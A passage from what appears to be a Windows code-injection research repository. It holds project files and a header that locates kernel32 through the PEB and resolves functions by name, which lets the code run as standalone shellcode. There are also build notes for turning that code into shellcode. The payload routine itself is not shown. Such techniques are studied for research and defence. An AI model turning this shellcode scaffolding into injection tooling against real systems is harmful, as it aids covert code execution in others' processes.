//cl /c /FA /GS- ShellcodeInjection.cpp
//Delete xdata and pdata, comment INCLUDELIB LIBCMT and INCLUDELIB OLDNAMES
//ml64 /c ShellcodeInjection.asm /link /entry:AlignRSP

int main(DWORD* dwCodeID)
{
    kernel32Iat iat;
    if (initializeIatShellcode(iat)) {
        return 1;
    }
    SpawnPayload(dwCodeID, iat);

    return 0;   
}
```

`ShellcodeInjection/ShellcodeInjection.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{4225c8d1-e331-4436-ba0c-4f8051b8cbdf}</ProjectGuid>
    <RootNamespace>ShellcodeInjection</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="ShellcodeInjection.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="defs.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`ShellcodeInjection/ShellcodeInjection.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Archivos de origen">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Archivos de encabezado">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Archivos de recursos">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="ShellcodeInjection.cpp">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="defs.h">
      <Filter>Archivos de encabezado</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`ShellcodeInjection/ShellcodeInjection.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`ShellcodeInjection/defs.h`:

```h
#pragma once
#include <Windows.h>
#define RTL_MAX_DRIVE_LETTERS 32
#include <winternl.h>
//Header based on https://github.com/hasherezade/masm_shc/blob/master/demos/peb_lookup.h

#ifndef TO_LOWERCASE
#define TO_LOWERCASE(out, c1) (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a': c1)
#endif

// enhanced version of LDR_DATA_TABLE_ENTRY
typedef struct _LDR_DATA_TABLE_ENTRY1 {
    LIST_ENTRY  InLoadOrderLinks;
    LIST_ENTRY  InMemoryOrderLinks;
    LIST_ENTRY  InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    ULONG   SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG   Flags;
    SHORT   LoadCount;
    SHORT   TlsIndex;
    HANDLE  SectionHandle;
    ULONG   CheckSum;
    ULONG   TimeDateStamp;
} LDR_DATA_TABLE_ENTRY1, * PLDR_DATA_TABLE_ENTRY1;

inline LPVOID GetModuleByName(WCHAR* module_name)
{
    PEB* peb;
#if defined(_WIN64)
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif
    PEB_LDR_DATA* ldr = peb->Ldr;

    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    for (LIST_ENTRY* current = head->Flink; current != head; current = current->Flink) {
        LDR_DATA_TABLE_ENTRY1* entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY1, InMemoryOrderLinks);
        if (!entry || !entry->DllBase) break;

        WCHAR* curr_name = entry->BaseDllName.Buffer;
        if (!curr_name) continue;

        size_t i;
        for (i = 0; i < entry->BaseDllName.Length; i++) {
            // if any of the strings finished:
            if (module_name[i] == 0 || curr_name[i] == 0) {
                break;
            }
            WCHAR c1, c2;
            TO_LOWERCASE(c1, module_name[i]);
            TO_LOWERCASE(c2, curr_name[i]);
            if (c1 != c2) break;
        }
        // both of the strings finished, and so far they were identical:
        if (module_name[i] == 0 && curr_name[i] == 0) {
            return entry->DllBase;
        }
    }

    return NULL;
}

inline LPVOID GetFunctionByName(LPVOID module, char* func_name)
{
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
    IMAGE_DATA_DIRECTORY* exportsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    if (!exportsDir->VirtualAddress) {
        return NULL;
    }

    DWORD expAddr = exportsDir->VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(expAddr + (ULONG_PTR)module);
    SIZE_T namesCount = exp->NumberOfNames;

    DWORD funcsListRVA = exp->AddressOfFunctions;
    DWORD funcNamesListRVA = exp->AddressOfNames;
    DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;

    //go through names:
    for (SIZE_T i = 0; i < namesCount; i++) {
        DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)module + i * sizeof(DWORD));
        WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)module + i * sizeof(WORD));
        DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));

        LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)module);
        size_t k;
        for (k = 0; func_name[k] != 0 && curr_name[k] != 0; k++) {
            if (func_name[k] != curr_name[k]) break;
        }
        if (func_name[k] == 0 && curr_name[k] == 0) {
            //found
            return (BYTE*)module + (*funcRVA);
        }
    }
    return NULL;
}

struct kernel32Iat {
    BOOL(WINAPI* _SetConsoleOutputCP)(UINT wCodePageID);
    HWND(WINAPI* _GetConsoleWindow)();
    BOOL(WINAPI* _SetConsoleCP)(UINT wCodePageID);
    BOOL(WINAPI* _AllocConsole)();
    LANGID(WINAPI* _SetThreadUILanguage)(LANGID LangId);
    FARPROC(WINAPI* _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
}iat_kernel32, * piat_struct32;
```

`ShellcodeInjection/mllink$.lnk`:

```lnk
/OUT:ShellcodeInjection.exe
ShellcodeInjection.obj
/entry:AlignRSP

```

`ShellcodeInjection/x64/Release/ShellcodeInjection.exe.recipe`:

```recipe
<?xml version="1.0" encoding="utf-8"?>
<Project>
  <ProjectOutputs>
    <ProjectOutput>
      <FullPath>C:\Users\USER\source\repos\NLSRegistryCodeInjection\x64\Release\ShellcodeInjection.exe</FullPath>
    </ProjectOutput>
  </ProjectOutputs>
  <ContentFiles />
  <SatelliteDlls />
  <NonRecipeFileRefs />
</Project>
```